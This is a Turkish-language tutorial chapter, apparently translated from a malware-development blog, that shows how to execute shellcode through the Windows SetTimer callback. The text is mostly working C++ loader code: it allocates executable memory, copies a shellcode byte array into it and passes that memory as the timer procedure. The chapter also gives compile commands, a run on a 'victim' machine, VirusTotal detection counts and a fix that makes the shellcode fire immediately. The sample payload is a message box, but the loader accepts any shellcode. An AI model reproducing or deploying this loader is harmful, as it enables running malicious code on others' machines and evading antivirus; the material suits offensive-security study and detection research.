\newpage
\subsection{44. kötü amaçlı yazılım geliştirme tekniği: SetTimerKullanarak shellcode çalıştırma. Basit C++ örneği}

﷽

![trick](./images/98/2023-06-04_13-37.png){width="80%"}      

Bu makale, `SetTimer` fonksiyonu aracılığıyla shellcode çalıştırma konusunda yaptığım kendi araştırmalarımın bir sonucudur.     

### SetTimer

`SetTimer` fonksiyonu, Windows API'nin bir parçasıdır. Belirtilen bir zaman aşımı değeri ile bir zamanlayıcı (`timer`) oluşturmak için kullanılır.       

Temel sözdizimi şu şekildedir:     

```cpp
UINT_PTR SetTimer(
  HWND      hWnd,
  UINT_PTR  nIDEvent,
  UINT      uElapse,
  TIMERPROC lpTimerFunc
);
```

Bu parametrelerin açıklamaları şu şekildedir:    

- `hWnd` : Zamanlayıcı ile ilişkilendirilecek pencerenin tanıtıcısı (handle). Bu pencere, çağıran iş parçacığı (thread) tarafından yönetilmelidir. Eğer `hWnd` değeri `NULL` olarak geçirilirse ve `nIDEvent` mevcut bir zamanlayıcının kimliğiyle eşleşirse, eski zamanlayıcı yeni olanla değiştirilir.     
- `nIDEvent` : Sıfır olmayan bir zamanlayıcı tanımlayıcısı. Eğer hWnd parametresi `NULL` ise ve `nIDEvent` mevcut bir zamanlayıcı ile eşleşmiyorsa, bu değer yok sayılır ve yeni bir zamanlayıcı kimliği oluşturulur. Eğer `hWnd` değeri `NULL` değilse ve belirtilen pencere (`hWnd`) zaten nIDEvent değeriyle bir zamanlayıcıya sahipse, mevcut zamanlayıcı yeni olanla değiştirilir. SetTimer bir zamanlayıcıyı değiştirdiğinde, zamanlayıcı sıfırlanır.     
- `uElapse` : Zaman aşımı değeri (timeout value), milisaniye cinsinden belirtilir.    
- `lpTimerFunc` : Zaman aşımı süresi dolduğunda bildirim gönderecek işlevin adresi. Eğer bu parametre `NULL` olarak ayarlanırsa, sistem uygulama kuyruğuna bir `WM_TIMER` mesajı gönderir. Bu mesaj pencere prosedürü tarafından işlenir.     

### Pratik örnek

Peki, işin püf noktası nedir? Sadece aşağıdaki koda göz atın (`hack.c`):     

```cpp
/*
 * hack.cpp - run shellcode via SetTimer. C++ implementation
 * @cocomelonc
 * https://cocomelonc.github.io/malware/2023/06/04/malware-tricks-31.html
*/
#include <stdio.h>
#include <windows.h>

int main(int argc, char* argv[]) {
  unsigned char my_payload[] =
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";

  PVOID mem = VirtualAlloc(NULL, sizeof(my_payload), MEM_COMMIT | MEM_RESERVE, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, my_payload, sizeof(my_payload));
  UINT_PTR dummy = 0;
  MSG msg;

  SetTimer(NULL, dummy, NULL, (TIMERPROC)mem);
  GetMessageA(&msg, NULL, 0, 0);
  DispatchMessageA(&msg);

  return 0;
}
```

Gördüğünüz gibi, bu kod `SetTimer` Windows API işlevini kullanarak shellcode çalıştırmayı amaçlıyor. Bunu, zamanlayıcı süresi dolduğunda çağrılacak bir işlevin (`TIMERPROC`) adresini sağlayarak gerçekleştiriyor.     

Her zamanki gibi, basit olması adına `meow-meow` mesaj kutusu payload'unu kullandım:     

```cpp
unsigned char my_payload[] =
  // 64-bit meow-meow messagebox
  "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
  "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
  "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
  "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
  "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
  "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
  "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
  "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
  "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
  "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
  "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
  "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
  "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
  "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
  "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
  "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
  "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
  "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
  "\x2e\x2e\x5e\x3d\x00";
```

### demo

Haydi, her şeyi çalışırken görelim. "Malware" kodumuzu derleyelim:      

```bash
x86_64-w64-mingw32-g++ -O2 hack.c -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![trick](./images/98/2023-06-04_13-38.png){width="80%"}      

Ve bunu kurbanın makinesinde çalıştıralım:     

```powershell
.\hack.exe
```

![trick](./images/98/2023-06-04_13-59.png){width="80%"}      

Gördüğünüz gibi, her şey mükemmel şekilde çalıştı! =^..^=    

Haydi, `hack.exe` dosyasını VirusTotal'a yükleyelim:    

![trick](./images/98/2023-06-04_14-01.png){width="80%"}      

**Yani, 71 antivirüs motorundan 19'u dosyamızı kötü amaçlı olarak algıladı.**      

[https://www.virustotal.com/gui/file/6b418cb08b87c07246170577503e9ef2e98f39e44afa9b53a0747fa9f5ed524e/detection](https://www.virustotal.com/gui/file/6b418cb08b87c07246170577503e9ef2e98f39e44afa9b53a0747fa9f5ed524e/detection)       

Ancak, bence PoC kodumuzda bir sorun var.     

`SetTimer` fonksiyonu, `uElapse` parametresinin ayarlanmasını gerektirir. Bu parametre, milisaniye cinsinden zaman aşımı süresini temsil eder. Eğer `NULL` veya `0` olarak ayarlanırsa, fonksiyon zamanlayıcıyı çalıştırmaz.Bu yüzden shellcode'u anında yürütmek istiyorsak, `uElapse` değerini `1` olarak ayarlamalıyız. Şöyle bir şey:    

```cpp
SetTimer(NULL, dummy, 1, (TIMERPROC)mem);  // Set uElapse to 1
while (GetMessageA(&msg, NULL, 0, 0)) {    // Using while loop to keep the 
                                           //message pump running
  DispatchMessageA(&msg);
}
```

Bu kod, neredeyse anında sona eren bir zamanlayıcı oluşturacak ve callback fonksiyonu olarak shellcode'u çalıştıracaktır.Tabii ki, bu tür bir teknik zamanlayıcı geri çağrısı (callback) üzerinden kod çalıştırma anomali davranışı nedeniyle antivirüs yazılımları tarafından kötü amaçlı olarak tespit edilebilir.    

Şimdiye kadar bu tekniği gerçek dünyadaki kötü amaçlı yazılımlarda veya APT saldırılarında görmedim.Umarım bu gönderi, mavi takım üyelerinin farkındalığını artırır ve kırmızı takım üyelerinin cephaneliğine yeni bir teknik ekler.      

[SetTimer](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-settimer)      
[Malware dev tricks. Run shellcode via EnumDesktopsA](https://cocomelonc.github.io/tutorial/2022/06/27/malware-injection-20.html)        
[Classic DLL injection into the process. Simple C++ malware](https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html)        
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2023-06-04-malware-tricks-31)           
